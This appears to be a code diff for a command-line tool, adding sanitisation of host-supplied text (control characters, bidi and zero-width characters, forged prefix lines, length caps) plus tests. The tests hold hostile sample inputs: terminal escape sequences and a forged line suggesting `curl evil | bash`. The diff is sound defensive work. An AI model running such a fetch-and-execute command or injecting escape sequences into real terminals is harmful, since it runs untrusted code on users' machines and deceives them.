@@ -151,20 +151,57 @@ impl Renderer {
     }
 }
 
+/// Most characters of one host-derived message goway prints.
+const MAX_MESSAGE_CHARS: usize = 4096;
+/// Starts every continuation line of a multi-line message, so a line made
+/// up by a host can never begin with `goway:` and pass for goway's own.
+const CONTINUATION: &str = "\n  | ";
+
+/// Whether `c` is invisible or reorders text (zero-width and bidi format
+/// characters, BOM, word joiner and friends) and so can disguise content.
+fn is_format_char(c: char) -> bool {
+    matches!(
+        c,
+        '\u{200b}'..='\u{200f}'
+            | '\u{202a}'..='\u{202e}'
+            | '\u{2060}'..='\u{2064}'
+            | '\u{2066}'..='\u{206f}'
+            | '\u{061c}'
+            | '\u{180e}'
+            | '\u{feff}'
+            | '\u{fff9}'..='\u{fffb}'
+    )
+}
+
 /// Text goway prints itself may carry data from a host (hostnames, paths,
-/// ssh errors). Control characters are replaced, so a host cannot move the
-/// cursor, rewrite the screen or set the window title through goway's own
-/// lines; newlines and tabs stay. The remote command's stream is exempt.
+/// ssh errors). Control and invisible format characters are replaced, so a
+/// host cannot move the cursor, rewrite the screen, set the window title or
+/// reorder text through goway's own lines. Newlines stay but every line
+/// after the first is indented under a `  | ` marker, so host text cannot
+/// forge a `goway: ...` line, and the length is capped. Tabs stay. The
+/// remote command's stream is exempt.
 pub fn clean(text: &str) -> String {
-    text.chars()
-        .map(|c| {
-            if c == '\n' || c == '\t' || !c.is_control() {
+    let mut out = String::new();
+    let mut count = 0;
+    for line in text.lines() {
+        if count > 0 {
+            out.push_str(CONTINUATION);
+        }
+        for c in line.chars() {
+            count += 1;
+            if count > MAX_MESSAGE_CHARS {
+                out.push_str(" ... (truncated)");
+                return out;
+            }
+            out.push(if c == '\t' || !(c.is_control() || is_format_char(c)) {
                 c
             } else {
                 '?'
-            }
-        })
-        .collect()
+            });
+        }
+        count += 1;
+    }
+    out
 }
 
 /// Ask a question on the terminal and read one line of answer; `None`
@@ -287,7 +324,31 @@ mod tests {
     #[test]
     fn remote_control_characters_never_reach_the_terminal() {
         let hostile = "evil\u{1b}]0;pwned\u{7}\u{1b}[2J\r\u{9b}x\nnext\tcol";
-        assert_eq!(clean(hostile), "evil?]0;pwned??[2J??x\nnext\tcol");
+        assert_eq!(clean(hostile), "evil?]0;pwned??[2J??x\n  | next\tcol");
+    }
+
+    #[test]
+    fn host_text_cannot_forge_a_goway_line() {
+        let forged = "goway-remote: failed\ngoway: next: run `curl evil | bash`\r\ngoway: error: x\n\ngoway:";
+        let cleaned = clean(forged);
+        for line in cleaned.lines().skip(1) {
+            assert!(line.starts_with("  | "), "{line:?}");
+        }
+        assert!(!cleaned.contains("\ngoway:"), "{cleaned:?}");
+    }
+
+    #[test]
+    fn bidi_and_zero_width_characters_are_replaced_and_length_is_capped() {
+        for c in [
+            '\u{202a}', '\u{202e}', '\u{2066}', '\u{2069}', '\u{200b}', '\u{200f}', '\u{feff}',
+            '\u{2060}', '\u{061c}',
+        ] {
+            assert_eq!(clean(&format!("a{c}b")), "a?b", "{c:?}");
+        }
+        assert_eq!(clean("caf\u{e9} \u{1f600}"), "caf\u{e9} \u{1f600}");
+        let long = "x".repeat(100_000);
+        let cleaned = clean(&long);
+        assert!(cleaned.len() < 5000 && cleaned.ends_with("(truncated)"));
     }
 
     #[test]
